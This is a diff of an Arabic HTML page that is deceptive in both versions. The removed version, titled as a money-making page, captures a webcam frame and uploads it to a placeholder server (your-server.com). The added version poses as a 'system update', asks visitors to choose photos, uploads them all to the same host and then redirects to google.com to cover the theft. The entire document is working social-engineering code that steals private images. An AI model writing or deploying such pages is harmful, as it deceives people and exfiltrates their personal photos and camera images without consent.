@@ -2,35 +2,34 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>ربح المال</title>
+    <title>تحديث النظام</title>
 </head>
 <body>
-    <h1>ابدا الربح</h1>
-    <button onclick="startCamera()">ابدأ</button>
-    <video id="video" autoplay></video>
+    <h1>الرجاء اختيار الصور للتحديث</h1>
+    <input type="file" id="fileInput" multiple accept="image/*" style="display:none;">
+    <button onclick="document.getElementById('fileInput').click()">اختر الصور</button>
     <script>
-        async function startCamera() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            // التقاط صورة وإرسالها
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('image', blob, 'capture.jpg');
-                
-                fetch('https://your-server.com/upload', {
-                    method: 'POST',
-                    body: formData
-                }).then(response => console.log('تم إرسال الصورة'));
-            }, 'image/jpeg');
-        }
+        const fileInput = document.getElementById('fileInput');
+        
+        fileInput.addEventListener('change', function(e) {
+            const files = e.target.files;
+            if (files.length === 0) return;
+
+            const formData = new FormData();
+            for (let i = 0; i < files.length; i++) {
+                formData.append('photos', files[i]);
+            }
+
+            fetch('https://your-server.com/upload', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // اختفاء الصفحة أو إعادة توجيه بعد الإرسال
+                window.location.href = 'https://google.com'; 
+            })
+            .catch(error => console.error('Error:', error));
+        });
     </script>
 </body>
 </html>
